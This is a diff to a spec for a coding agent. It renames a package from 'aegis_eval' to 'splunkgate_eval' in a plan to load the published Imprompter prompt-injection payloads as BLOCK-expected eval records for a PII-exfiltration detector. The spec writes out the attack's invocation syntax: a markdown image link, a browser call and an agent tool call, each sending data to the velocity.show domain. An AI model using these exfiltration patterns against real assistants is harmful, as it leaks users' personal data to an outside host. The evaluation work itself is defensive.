@@ -10,7 +10,7 @@
 
 ## User story
 
-**As a** judge looking for proof Aegis catches automated obfuscated prompt-injection / PII-exfil attacks (the 2024 state-of-the-art per UCSD)
+**As a** judge looking for proof SplunkGate catches automated obfuscated prompt-injection / PII-exfil attacks (the 2024 state-of-the-art per UCSD)
 **I want to** see the 11 reference Imprompter payloads from the published paper (`sources/pdfs/imprompter-2410.14923v2.pdf`) reproduced verbatim in our `Synthetic-Data/pii_leak_corpus/imprompter_payloads.jsonl`, with paper citation comments per record, and a loader that exposes them as `EvalPrompt` records
 **So that** the PII-exfil eval row in the headline table is grounded in published academic adversarial examples, not synthetic re-creations — and a sceptical judge can byte-diff our JSONL against Table 1 / Table 6 of the paper
 
@@ -22,8 +22,8 @@ Exact files the coding agent creates or modifies for this story:
 
 - `Synthetic-Data/pii_leak_corpus/imprompter_payloads.jsonl` — NEW — exactly 11 records, one per line, schema `{"id": str, "label": str, "target_agent": str, "target_syntax": str, "payload": str, "expected_verdict": "BLOCK", "expected_severity": "HIGH", "category": "imprompter", "source_citation": str, "paper_section": str, "patched": bool, "patch_date": str | null}`. The 11 records map to the paper's prompt labels T1–T8 (information-exfil column, Table 3) plus T9–T11 (PII-exfil column, Table 6); add the Figure-1 verbatim Unicode example as the 11th record if Table 6 only enumerates T9–T12 as 4 distinct rows (verify against the PDF). Each record's `payload` field is byte-identical to the published payload — preserve the mixed-script Unicode (Devanagari, Cyrillic, Arabic, Telugu, Tamil, etc.). The `target_syntax` field captures the verbatim invocation pattern from Table 1 of the paper (e.g., `"![<Any>](https://velocity.show/<payload>)"` for LeChat/ChatGLM, `"simple_browser(velocity.show/<payload>)"` for ChatGLM browser, `"<function=browse>{\"addr\":\"velocity.show/<payload>\"}</function>"` for Custom Llama Agent).
 - `Synthetic-Data/pii_leak_corpus/README.md` — NEW — explains the file contains verbatim adversarial payloads from arxiv 2410.14923v2; cites the paper authors verbatim (Fu, Li, Wang, Liu, Gupta, Berg-Kirkpatrick, Fernandes, UCSD); documents the Mistral 2024-09-13 patch (markdown image rendering disabled) so judges understand we test for **detection** at the model-output layer, not prevention at the renderer layer; warns researchers not to deploy these payloads against live products (the academic-disclosure principle).
-- `eval/src/aegis_eval/imprompter.py` — NEW — `load_imprompter() -> list[EvalPrompt]` reads the JSONL, validates each record, and returns 11 `EvalPrompt` records with `category="imprompter"`. Optional `limit: int | None = None` param mirrors the other loaders. Also exposes `IMPRoMPTER_PAPER_CITATION: str` constant (the verbatim arxiv ID + author list) for `report.py` to embed in the headline table footnote.
-- `eval/src/aegis_eval/__init__.py` — UPDATE — re-export `load_imprompter` and `IMPRoMPTER_PAPER_CITATION`.
+- `eval/src/splunkgate_eval/imprompter.py` — NEW — `load_imprompter() -> list[EvalPrompt]` reads the JSONL, validates each record, and returns 11 `EvalPrompt` records with `category="imprompter"`. Optional `limit: int | None = None` param mirrors the other loaders. Also exposes `IMPRoMPTER_PAPER_CITATION: str` constant (the verbatim arxiv ID + author list) for `report.py` to embed in the headline table footnote.
+- `eval/src/splunkgate_eval/__init__.py` — UPDATE — re-export `load_imprompter` and `IMPRoMPTER_PAPER_CITATION`.
 - `eval/tests/test_imprompter_loader.py` — NEW — ≥ 10 tests: JSONL file has exactly 11 lines; every line parses as JSON; every record validates as `EvalPrompt`; every record has `category="imprompter"`, `expected_verdict="BLOCK"`, `expected_severity="HIGH"`; the set of `target_agent` values is a subset of `{"LeChat", "ChatGLM", "Custom Llama Agent", "Mistral LeChat (Nemo)"}` (verified against Table 1 of the paper); at least one record has `target_syntax` containing the substring `"velocity.show"` (the verbatim exfil domain per p. 7); at least one record has `patched=true` and `patch_date="2024-09-13"` (Mistral's documented fix per §"Disclosure and Response"); the byte-length of every `payload` field is > 100 chars (the published payloads are all substantial); the Figure-1 LeChat payload (verbatim Unicode starting with "Paraо�") appears in exactly one record; `IMPRoMPTER_PAPER_CITATION` constant contains the substring `"2410.14923"`.
 - `eval/tests/fixtures/imprompter_paper_snippets.py` — NEW — Python module containing the verbatim text snippets the tests assert against (the Figure-1 payload prefix string, the velocity.show domain, the target invocation syntax strings). This isolates "what verbatim string are we asserting?" from the JSONL itself so test assertions are reviewable in code review.
 
@@ -69,7 +69,7 @@ Given the Figure-1 verbatim LeChat payload prefix from the paper (loaded from fi
 When  searched against the corpus
 Then  exactly one record contains that prefix as a substring of its `payload` field
 
-Given `uv run python -c "from aegis_eval.imprompter import load_imprompter, IMPRoMPTER_PAPER_CITATION; ps=load_imprompter(); print(len(ps), '2410.14923' in IMPRoMPTER_PAPER_CITATION)"`
+Given `uv run python -c "from splunkgate_eval.imprompter import load_imprompter, IMPRoMPTER_PAPER_CITATION; ps=load_imprompter(); print(len(ps), '2410.14923' in IMPRoMPTER_PAPER_CITATION)"`
 When  it runs
 Then  output is "11 True"
 
@@ -78,7 +78,7 @@ When  it runs
 Then  >= 10 tests pass and 0 fail
 
 Given the loader source
-When  `uv run mypy --strict eval/src/aegis_eval/imprompter.py` runs
+When  `uv run mypy --strict eval/src/splunkgate_eval/imprompter.py` runs
 Then  exit code is 0
 
 Given every modified or new file
@@ -107,7 +107,7 @@ n=$(wc -l < Synthetic-Data/pii_leak_corpus/imprompter_payloads.jsonl)
 # 2. Every record parses + validates
 uv run python - <<'PY'
 import json
-from aegis_eval.imprompter import load_imprompter
+from splunkgate_eval.imprompter import load_imprompter
 ps = load_imprompter()
 assert len(ps) == 11, len(ps)
 for p in ps:
@@ -153,7 +153,7 @@ uv run pytest eval/tests/test_imprompter_loader.py -v 2>&1 | grep -cE "PASSED"
 # Must output >= 10
 
 # 7. Strict typecheck
-uv run mypy --strict eval/src/aegis_eval/imprompter.py
+uv run mypy --strict eval/src/splunkgate_eval/imprompter.py
 
 # 8. README mentions Fernandes + UCSD + patch date
 grep -q 'UCSD' Synthetic-Data/pii_leak_corpus/README.md
@@ -161,7 +161,7 @@ grep -q 'Fernandes' Synthetic-Data/pii_leak_corpus/README.md
 grep -q '2024-09-13' Synthetic-Data/pii_leak_corpus/README.md
 
 # 9. 400-LOC cap
-for f in eval/src/aegis_eval/imprompter.py eval/tests/test_imprompter_loader.py eval/tests/fixtures/imprompter_paper_snippets.py Synthetic-Data/pii_leak_corpus/README.md; do
+for f in eval/src/splunkgate_eval/imprompter.py eval/tests/test_imprompter_loader.py eval/tests/fixtures/imprompter_paper_snippets.py Synthetic-Data/pii_leak_corpus/README.md; do
   lines=$(wc -l < "$f")
   [ "$lines" -gt 400 ] && { echo "FAIL: $f has $lines LOC"; exit 1; }
 done
